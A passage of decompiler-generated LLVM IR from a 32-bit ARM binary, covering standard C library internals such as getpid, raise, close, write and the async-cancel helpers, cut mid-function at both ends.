  %v0_d9f0 = load i32, i32* @r5, align 4
  store i32 %v0_d9f0, i32* %r0.global-to-local, align 4
  %v1_d9f4 = inttoptr i32 %v0_d9f0 to i32*
  %v2_d9f4 = call i32 @__linkin_atfork(i32* %v1_d9f4)
  store i32 %v2_d9f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %bb51, %dec_label_pc_d9c8, %dec_label_pc_d9e8
  store i32 1256, i32* %r7.global-to-local, align 4
  %v0_d9fc = load i32, i32* @r6, align 4
  %v2_d9fc = add i32 %v0_d9fc, 1256
  store i32 %v2_d9fc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_da00

dec_label_pc_da00:                                ; preds = %dec_label_pc_da30.dec_label_pc_da00_crit_edge, %dec_label_pc_d9f8
  %v0_da08 = phi i32 [ %v0_da08.pre, %dec_label_pc_da30.dec_label_pc_da00_crit_edge ], [ %v2_d9fc, %dec_label_pc_d9f8 ]
  %v1_da00 = phi i32 [ %v1_da00.pre, %dec_label_pc_da30.dec_label_pc_da00_crit_edge ], [ 1256, %dec_label_pc_d9f8 ]
  %v0_da00 = phi i32 [ %v0_da00.pre, %dec_label_pc_da30.dec_label_pc_da00_crit_edge ], [ %v0_d9fc, %dec_label_pc_d9f8 ]
  %v2_da00 = add i32 %v0_da00, %v1_da00
  %v3_da00 = inttoptr i32 %v2_da00 to i32*
  %v4_da00 = load i32, i32* %v3_da00, align 4
  store i32 %v4_da00, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_da08, i32* %r2.global-to-local, align 4
  %v1_da0c60 = inttoptr i32 %v0_da08 to i32*
  %v2_da0c61 = load i32, i32* %v1_da0c60, align 4
  store i32 %v2_da0c61, i32* %r3.global-to-local, align 4
  %v3_da1063 = icmp uge i32 %v2_da0c61, %v4_da00
  store i1 %v3_da1063, i1* %cpsr_c.global-to-local, align 1
  %v9_da1069 = icmp eq i32 %v2_da0c61, %v4_da00
  br i1 %v9_da1069, label %dec_label_pc_da18, label %dec_label_pc_da30

dec_label_pc_da18:                                ; preds = %dec_label_pc_da00, %dec_label_pc_da18.dec_label_pc_da0c_crit_edge
  %v0_da1870 = phi i32 [ %v1_da10.pre, %dec_label_pc_da18.dec_label_pc_da0c_crit_edge ], [ %v4_da00, %dec_label_pc_da00 ]
  store i32 %v0_da1870, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_da28 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_da28, label %dec_label_pc_da2c, label %dec_label_pc_da18.dec_label_pc_da0c_crit_edge

dec_label_pc_da18.dec_label_pc_da0c_crit_edge:    ; preds = %dec_label_pc_da18
  %v0_da0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_da10.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_da0c = inttoptr i32 %v0_da0c.pre to i32*
  %v2_da0c = load i32, i32* %v1_da0c, align 4
  store i32 %v2_da0c, i32* %r3.global-to-local, align 4
  %v3_da10 = icmp uge i32 %v2_da0c, %v1_da10.pre
  store i1 %v3_da10, i1* %cpsr_c.global-to-local, align 1
  %v9_da10 = icmp eq i32 %v2_da0c, %v1_da10.pre
  br i1 %v9_da10, label %dec_label_pc_da18, label %dec_label_pc_da30

dec_label_pc_da2c:                                ; preds = %dec_label_pc_da18
  %v0_da2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_da2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da30

dec_label_pc_da30:                                ; preds = %dec_label_pc_da00, %dec_label_pc_da18.dec_label_pc_da0c_crit_edge, %dec_label_pc_da2c
  %v0_da38 = phi i32 [ %v0_da2c, %dec_label_pc_da2c ], [ %v2_da0c61, %dec_label_pc_da00 ], [ %v2_da0c, %dec_label_pc_da18.dec_label_pc_da0c_crit_edge ]
  %v1_da30 = phi i32 [ %v0_da2c, %dec_label_pc_da2c ], [ %v4_da00, %dec_label_pc_da00 ], [ %v1_da10.pre, %dec_label_pc_da18.dec_label_pc_da0c_crit_edge ]
  %v3_da30 = icmp uge i32 %v0_da38, %v1_da30
  store i1 %v3_da30, i1* %cpsr_c.global-to-local, align 1
  %v9_da30 = icmp eq i32 %v0_da38, %v1_da30
  br i1 %v9_da30, label %dec_label_pc_da38, label %dec_label_pc_da30.dec_label_pc_da00_crit_edge

dec_label_pc_da30.dec_label_pc_da00_crit_edge:    ; preds = %dec_label_pc_da30
  %v0_da00.pre = load i32, i32* @r6, align 4
  %v1_da00.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_da08.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_da00

dec_label_pc_da38:                                ; preds = %dec_label_pc_da30
  %v2_da38 = icmp ne i32 %v1_da30, 0
  store i1 %v2_da38, i1* %cpsr_c.global-to-local, align 1
  %v7_da3c = icmp slt i32 %v1_da30, 2
  br i1 %v7_da3c, label %dec_label_pc_da58, label %dec_label_pc_da40

dec_label_pc_da40:                                ; preds = %dec_label_pc_da38
  %v0_da40 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_da40, i32* %r0.global-to-local, align 4
  %v0_da44 = load i32, i32* %r1.global-to-local, align 4
  %v1_da44 = add i32 %v0_da44, 129
  store i32 %v1_da44, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_da58

dec_label_pc_da58:                                ; preds = %dec_label_pc_da40, %dec_label_pc_da38
  %v0_da58 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_da58 = icmp eq i32 %v0_da58, 0
  %. = select i1 %v2_da58, i32 12, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  store i32 %v3_d8f8, i32* %r4.global-to-local, align 4
  store i32 %v12_d8f8, i32* %r7.global-to-local, align 4
  store i32 %v15_d8f8, i32* %r8.global-to-local, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_da2c, { 1, 0, 2 }
  uselistorder i32 %v1_da10.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_d9a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d98c, { 1, 2, 0 }
  uselistorder i32 %v1_d980, { 1, 2, 0 }
  uselistorder i32 %v0_d980, { 0, 2, 1 }
  uselistorder i32 %v0_d98c, { 0, 2, 1 }
  uselistorder i32 %v0_d968.pre, { 0, 2, 1 }
  uselistorder i32 %v0_d94c, { 1, 0, 2 }
  uselistorder i32 %v1_d930.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 15, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 5, 4, 9, 10, 6, 7, 8, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 10, 11, 5, 0, 6, 9, 7, 8, 12, 13 }
  uselistorder i32 1260, { 0, 2, 1, 3 }
  uselistorder i32 1256, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_da30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_da18, { 1, 0 }
  uselistorder label %dec_label_pc_d9f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d970, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_d950, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d938, { 1, 0 }
}

define i32 @function_da74(i32 %arg1) local_unnamed_addr {
dec_label_pc_da74:
  %v0_da74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_da74, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_da74
  %v2_da74 = load i32, i32* @r8, align 4
  %v3_da74 = udiv i32 %v2_da74, 512
  %v4_da74 = mul i32 %v2_da74, 8388608
  %v5_da74 = or i32 %v3_da74, %v4_da74
  %v8_da74 = and i32 %v5_da74, %arg1
  %v2_da78 = load i32, i32* @ip, align 4
  %v3_da78 = udiv i32 %v2_da78, 512
  %v4_da78 = mul i32 %v2_da78, 8388608
  %v5_da78 = or i32 %v3_da78, %v4_da78
  %v8_da78 = and i32 %v8_da74, %v5_da78
  %v2_da7c = load i32, i32* @r4, align 4
  %v5_da7c = sdiv i32 %v2_da7c, 1024
  %v6_da7c = and i32 %v8_da78, %v5_da7c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_da74, %bb
  %v7_da7c = phi i32 [ %arg1, %dec_label_pc_da74 ], [ %v6_da7c, %bb ]
  ret i32 %v7_da7c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_da80 = load i32, i32* @r7, align 4
  store i32 %v3_da80, i32* %stack_var_-8, align 4
  %v0_da84 = call i32 @__aeabi_read_tp()
  store i32 %v0_da84, i32* %r0.global-to-local, align 4
  %v1_da88 = add i32 %v0_da84, -1060
  %v2_da88 = inttoptr i32 %v1_da88 to i32*
  %v3_da88 = load i32, i32* %v2_da88, align 4
  %tmp7 = icmp slt i32 %v3_da88, 1
  br i1 %tmp7, label %dec_label_pc_da98, label %dec_label_pc_dabc

dec_label_pc_da98:                                ; preds = %entry
  %v2_da8c = icmp eq i32 %v3_da88, 0
  br i1 %v2_da8c, label %dec_label_pc_da9c, label %dec_label_pc_daa8

dec_label_pc_da9c:                                ; preds = %dec_label_pc_da98
  %v1_da9c = add i32 %v0_da84, -1064
  %v2_da9c = inttoptr i32 %v1_da9c to i32*
  %v3_da9c = load i32, i32* %v2_da9c, align 4
  store i32 %v3_da9c, i32* %r0.global-to-local, align 4
  %v2_daa0 = icmp eq i32 %v3_da9c, 0
  br i1 %v2_daa0, label %bb, label %bb8

dec_label_pc_daa8:                                ; preds = %dec_label_pc_da98
  br label %bb8

bb:                                               ; preds = %dec_label_pc_da9c
  store i32 0, i32* %v2_da9c, align 4
  %v0_dab8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_daa8, %dec_label_pc_da9c, %bb
  %v0_dab8 = phi i32 [ %v3_da9c, %dec_label_pc_da9c ], [ %v0_da84, %dec_label_pc_daa8 ], [ %v0_dab8.pre, %bb ]
  br label %dec_label_pc_dabc

dec_label_pc_dabc:                                ; preds = %entry, %bb8
  %v0_dabc = phi i32 [ %v3_da88, %entry ], [ %v0_dab8, %bb8 ]
  store i32 %v0_dabc, i32* %r0.global-to-local, align 4
  %v2_dac0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_dac0, i32* @r7, align 4
  ret i32 %v0_dabc

; uselistorder directives
  uselistorder i32 %v0_dabc, { 1, 0 }
  uselistorder i32 %v3_da88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_dabc, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_dac8 = load i32, i32* @r4, align 4
  store i32 %v3_dac8, i32* %stack_var_-20, align 4
  %v0_dad0 = call i32 @__aeabi_read_tp()
  store i32 %v0_dad0, i32* %r0.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad0, -1064
  %v2_dad4 = inttoptr i32 %v1_dad4 to i32*
  %v3_dad4 = load i32, i32* %v2_dad4, align 4
  store i32 %v3_dad4, i32* %r4.global-to-local, align 4
  %v2_dad8 = icmp eq i32 %v3_dad4, 0
  %v1_dae0 = add i32 %v0_dad0, -1060
  %v2_dae0 = inttoptr i32 %v1_dae0 to i32*
  %v3_dae0 = load i32, i32* %v2_dae0, align 4
  store i32 %v3_dae0, i32* %r0.global-to-local, align 4
  br i1 %v2_dad8, label %dec_label_pc_dae8, label %dec_label_pc_dafc

dec_label_pc_dae8:                                ; preds = %entry
  store i32 %v3_dae0, i32* %r4.global-to-local, align 4
  store i32 %v3_dae0, i32* %v2_dad4, align 4
  %v0_db24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_dafc:                                ; preds = %entry
  %v5_db00 = icmp sgt i32 %v3_dae0, 0
  br i1 %v5_db00, label %bb28, label %dec_label_pc_db04

dec_label_pc_db04:                                ; preds = %dec_label_pc_dafc
  %tmp = bitcast i32 %v3_dae0 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_db04 = bitcast float %tmp30 to i32
  %v2_db08 = icmp eq i32 %v1_db04, 0
  br i1 %v2_db08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_db04
  store i32 %v3_dad4, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_db04
  %v2_db10 = sub i32 0, %v3_dae0
  store i32 %v2_db10, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_dafc, %dec_label_pc_dae8, %.thread
  %v0_db28 = phi i32 [ %v3_dae0, %dec_label_pc_dafc ], [ %v0_db24.pre, %dec_label_pc_dae8 ], [ %v3_dad4, %bb ], [ %v2_db10, %.thread ]
  store i32 %v0_db28, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_db28, -4095
  br i1 %tmp31, label %dec_label_pc_db4c, label %dec_label_pc_db34

dec_label_pc_db34:                                ; preds = %bb28
  %v0_db38 = call i32 @__aeabi_read_tp()
  %v3_db3c = load i16, i16* @global_var_222f0.75, align 2
  %v4_db3c = sext i16 %v3_db3c to i32
  %v0_db40 = load i32, i32* %r2.global-to-local, align 4
  %v1_db40 = sub i32 0, %v0_db40
  store i32 %v1_db40, i32* %r2.global-to-local, align 4
  %v3_db44 = add i32 %v4_db3c, %v0_db38
  %v4_db44 = inttoptr i32 %v3_db44 to i32*
  store i32 %v1_db40, i32* %v4_db44, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_db4c

dec_label_pc_db4c:                                ; preds = %bb28, %dec_label_pc_db34
  %v0_db50 = phi i32 [ %v0_db28, %bb28 ], [ -1, %dec_label_pc_db34 ]
  %v3_db4c = icmp eq i32 %v0_db50, -1
  store i32 %v0_db50, i32* %r5.global-to-local, align 4
  br i1 %v3_db4c, label %dec_label_pc_db58, label %dec_label_pc_dba0

dec_label_pc_db58:                                ; preds = %dec_label_pc_db4c
  %v0_db5c = call i32 @__aeabi_read_tp()
  store i32 %v0_db5c, i32* %r0.global-to-local, align 4
  %v3_db60 = load i16, i16* @global_var_222f0.75, align 2
  %v4_db60 = sext i16 %v3_db60 to i32
  %v2_db64 = add i32 %v4_db60, %v0_db5c
  %v3_db64 = inttoptr i32 %v2_db64 to i32*
  %v4_db64 = load i32, i32* %v3_db64, align 4
  %v7_db68 = icmp eq i32 %v4_db64, 38
  br i1 %v7_db68, label %dec_label_pc_db74, label %dec_label_pc_db58.dec_label_pc_dba0_crit_edge

dec_label_pc_db58.dec_label_pc_dba0_crit_edge:    ; preds = %dec_label_pc_db58
  %v0_dba0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dba0

dec_label_pc_db74:                                ; preds = %dec_label_pc_db58
  %v0_db74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_db74, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_db74, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_db74
  %v5_db8c = sub i32 0, %v0_db74
  store i32 %v5_db8c, i32* %r2.global-to-local, align 4
  %v7_db90 = load i32, i32* inttoptr (i32 140016 to i32*), align 16
  %v4_db94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_db94, i32* %r0.global-to-local, align 4
  %v7_db98 = add i32 %v7_db90, %v0_db5c
  %v8_db98 = inttoptr i32 %v7_db98 to i32*
  store i32 %v5_db8c, i32* %v8_db98, align 4
  %v0_db9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_db74, %bb29
  %v0_db9c = phi i32 [ %v0_db9c.pre, %bb29 ], [ %v0_db74, %dec_label_pc_db74 ]
  store i32 %v0_db9c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db58.dec_label_pc_dba0_crit_edge, %dec_label_pc_db4c, %.thread22
  %v0_dba0 = phi i32 [ %v0_dba0.pre, %dec_label_pc_db58.dec_label_pc_dba0_crit_edge ], [ %v0_db50, %dec_label_pc_db4c ], [ %v0_db9c, %.thread22 ]
  store i32 %v0_dba0, i32* %r0.global-to-local, align 4
  %v2_dba4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dba4, i32* @r4, align 4
  ret i32 %v0_dba0

; uselistorder directives
  uselistorder i32 %v0_dba0, { 1, 0 }
  uselistorder i32 %v0_db74, { 1, 2, 0, 3 }
  uselistorder i32 %v0_db28, { 2, 0, 1 }
  uselistorder i32 %v3_dae0, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_dba0, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_db4c, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_dbd4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_dbd4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_dbd4 = load i32, i32* @r0, align 4
  ret i32 %v2_dbd4

bb1:                                              ; preds = %entry
  %v0_dbd8 = call i32 @__syscall_error()
  ret i32 %v0_dbd8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dbe4 = load i32, i32* @global_var_255f0.254, align 4
  %v2_dbe8 = icmp eq i32 %v3_dbe4, 0
  store i1 %v2_dbe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dbe8, label %dec_label_pc_dbf0, label %entry.dec_label_pc_dc0c_crit_edge

entry.dec_label_pc_dc0c_crit_edge:                ; preds = %entry
  %v3_dc0c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dc0c

dec_label_pc_dbf0:                                ; preds = %entry
  %v0_dbf0 = load i32, i32* @r7, align 4
  store i32 %v0_dbf0, i32* @ip, align 4
  %v0_dc00 = load i32, i32* @r0, align 4
  %v2_dc00 = icmp ugt i32 %v0_dc00, -4097
  %v7_dc00 = icmp eq i32 %v0_dc00, -4096
  store i1 %v7_dc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dc00, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_dc0c, %bb8, %bb9, %dec_label_pc_dbf0
  %merge2 = phi i32 [ %v0_dc00, %dec_label_pc_dbf0 ], [ %v0_dc30, %dec_label_pc_dc0c ], [ %v0_dc40, %bb8 ], [ %v0_dc40, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_dbf0
  %v0_dc08 = call i32 @__syscall_error()
  br label %dec_label_pc_dc0c

dec_label_pc_dc0c:                                ; preds = %entry.dec_label_pc_dc0c_crit_edge, %bb7
  %v3_dc0c = phi i32 [ %v3_dc0c.pre, %entry.dec_label_pc_dc0c_crit_edge ], [ %v0_dc08, %bb7 ]
  %v9_dc0c = load i32, i32* @r7, align 4
  store i32 %v9_dc0c, i32* %stack_var_-8, align 4
  %v12_dc0c = load i32, i32* @lr, align 4
  %v0_dc10 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_dc10, i32* @ip, align 4
  store i32 %v3_dc0c, i32* @r7, align 4
  %v1_dc2c = call i32 @__libc_disable_asynccancel(i32 %v0_dc10)
  %v0_dc30 = load i32, i32* @r7, align 4
  store i32 %v0_dc30, i32* @r0, align 4
  %v2_dc34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_dc34, i32* @r7, align 4
  store i32 %v12_dc0c, i32* @lr, align 4
  %v2_dc38 = icmp ugt i32 %v0_dc30, -4097
  %v7_dc38 = icmp eq i32 %v0_dc30, -4096
  store i1 %v7_dc38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dc38, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_dc0c
  %v0_dc40 = call i32 @__syscall_error()
  %v0_dc50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc50, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_dc50 = load i32, i32* @r1, align 4
  %v2_dc50 = load i32, i32* @r4, align 4
  %v3_dc50 = load i32, i32* @sb, align 4
  %v4_dc50 = lshr i32 %v2_dc50, %v3_dc50
  %v5_dc50 = sub i32 32, %v3_dc50
  %v6_dc50 = shl i32 %v2_dc50, %v5_dc50
  %v7_dc50 = or i32 %v6_dc50, %v4_dc50
  %v9_dc50 = and i32 %v7_dc50, %v1_dc50
  store i32 %v9_dc50, i32* @r7, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_dc40, { 1, 0 }
  uselistorder i32 %v0_dc30, { 0, 2, 3, 1 }
  uselistorder i32 %v0_dc00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dc0c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_dc64 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_dc64, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_dc64 = load i32, i32* @r0, align 4
  ret i32 %v2_dc64

bb1:                                              ; preds = %entry
  %v0_dc68 = call i32 @__syscall_error()
  ret i32 %v0_dc68
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_dc74 = load i32, i32* @global_var_255f0.254, align 4
  %v2_dc78 = icmp eq i32 %v3_dc74, 0
  br i1 %v2_dc78, label %dec_label_pc_dc80, label %entry.dec_label_pc_dc9c_crit_edge

entry.dec_label_pc_dc9c_crit_edge:                ; preds = %entry
  %v3_dc9c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dc9c

dec_label_pc_dc80:                                ; preds = %entry
  %v0_dc80 = load i32, i32* @r7, align 4
  store i32 %v0_dc80, i32* @ip, align 4
  %v0_dc90 = load i32, i32* @r0, align 4
  %v2_dc90 = icmp ugt i32 %v0_dc90, -4097
  br i1 %v2_dc90, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_dc9c, %dec_label_pc_dc80
  %merge = phi i32 [ %v0_dc90, %dec_label_pc_dc80 ], [ %v0_dcc0, %dec_label_pc_dc9c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_dc80
  %v0_dc98 = call i32 @__syscall_error()
  br label %dec_label_pc_dc9c

dec_label_pc_dc9c:                                ; preds = %entry.dec_label_pc_dc9c_crit_edge, %bb8
  %v3_dc9c = phi i32 [ %v3_dc9c.pre, %entry.dec_label_pc_dc9c_crit_edge ], [ %v0_dc98, %bb8 ]
  store i32 %v3_dc9c, i32* %stack_var_-24, align 4
  %v12_dc9c = load i32, i32* @r3, align 4
  %v15_dc9c = load i32, i32* @r7, align 4
  store i32 %v15_dc9c, i32* %stack_var_-8, align 4
  %v18_dc9c = load i32, i32* @lr, align 4
  %v0_dca0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_dca0, i32* @ip, align 4
  %v2_dca8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v12_dc9c, i32* @r3, align 4
  store i32 %v2_dca8, i32* @r7, align 4
  %v1_dcbc = call i32 @__libc_disable_asynccancel(i32 %v0_dca0)
  %v0_dcc0 = load i32, i32* @r7, align 4
  store i32 %v0_dcc0, i32* @r0, align 4
  %v2_dcc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_dcc4, i32* @r7, align 4
  store i32 %v18_dc9c, i32* @lr, align 4
  %v2_dcc8 = icmp ugt i32 %v0_dcc0, -4097
  br i1 %v2_dcc8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_dc9c
  %v0_dcd0 = call i32 @__syscall_error()
  ret i32 %v0_dcd0

; uselistorder directives
  uselistorder i32 %v0_dcc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_dc9c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_dce0 = load i32, i32* %r0.global-to-local, align 4
  %v1_dce0 = and i32 %v0_dce0, 2
  %v2_dce0 = icmp eq i32 %v1_dce0, 0
  %v3_dce4 = load i32, i32* @r4, align 4
  store i32 %v3_dce4, i32* %stack_var_-16, align 4
  br i1 %v2_dce0, label %dec_label_pc_dcec, label %dec_label_pc_dd60

dec_label_pc_dcec:                                ; preds = %entry
  %v0_dcec = call i32 @__aeabi_read_tp()
  store i32 %v0_dcec, i32* %r0.global-to-local, align 4
  %v1_dcf0 = add i32 %v0_dcec, -1036
  %v2_dcf0 = inttoptr i32 %v1_dcf0 to i32*
  %v3_dcf0 = load i32, i32* %v2_dcf0, align 4
  %v1_dcf4 = add i32 %v0_dcec, -1168
  store i32 %v1_dcf4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dcf8

dec_label_pc_dcf8:                                ; preds = %dec_label_pc_dd2c.dec_label_pc_dcf8_crit_edge, %dec_label_pc_dcec
  %v0_dd04 = phi i32 [ %v0_dd04.pre, %dec_label_pc_dd2c.dec_label_pc_dcf8_crit_edge ], [ %v1_dcf4, %dec_label_pc_dcec ]
  %v0_dcf8 = phi i32 [ %v0_dd2c, %dec_label_pc_dd2c.dec_label_pc_dcf8_crit_edge ], [ %v3_dcf0, %dec_label_pc_dcec ]
  %v1_dcf8 = and i32 %v0_dcf8, -3
  store i32 %v1_dcf8, i32* %r7.global-to-local, align 4
  store i32 %v0_dcf8, i32* %r4.global-to-local, align 4
  store i32 %v1_dcf8, i32* @r1, align 4
  %v1_dd04 = add i32 %v0_dd04, 132
  store i32 %v1_dd04, i32* @r2, align 4
  %v1_dd0823 = inttoptr i32 %v1_dd04 to i32*
  %v2_dd0824 = load i32, i32* %v1_dd0823, align 4
  %v3_dd0c26 = icmp uge i32 %v2_dd0824, %v0_dcf8
  store i1 %v3_dd0c26, i1* %cpsr_c.global-to-local, align 1
  %v9_dd0c32 = icmp eq i32 %v2_dd0824, %v0_dcf8
  br i1 %v9_dd0c32, label %dec_label_pc_dd14, label %dec_label_pc_dd2c

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dcf8, %dec_label_pc_dd14.dec_label_pc_dd08_crit_edge
  %v0_dd1433 = phi i32 [ %v1_dd0c.pre, %dec_label_pc_dd14.dec_label_pc_dd08_crit_edge ], [ %v0_dcf8, %dec_label_pc_dcf8 ]
  store i32 %v0_dd1433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_dd24 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_dd24, label %dec_label_pc_dd28, label %dec_label_pc_dd14.dec_label_pc_dd08_crit_edge

dec_label_pc_dd14.dec_label_pc_dd08_crit_edge:    ; preds = %dec_label_pc_dd14
  %v0_dd08.pre = load i32, i32* @r2, align 4
  %v1_dd0c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_dd08 = inttoptr i32 %v0_dd08.pre to i32*
  %v2_dd08 = load i32, i32* %v1_dd08, align 4
  %v3_dd0c = icmp uge i32 %v2_dd08, %v1_dd0c.pre
  store i1 %v3_dd0c, i1* %cpsr_c.global-to-local, align 1
  %v9_dd0c = icmp eq i32 %v2_dd08, %v1_dd0c.pre
  br i1 %v9_dd0c, label %dec_label_pc_dd14, label %dec_label_pc_dd2c

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd14
  %v0_dd28 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_dd2c

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dcf8, %dec_label_pc_dd14.dec_label_pc_dd08_crit_edge, %dec_label_pc_dd28
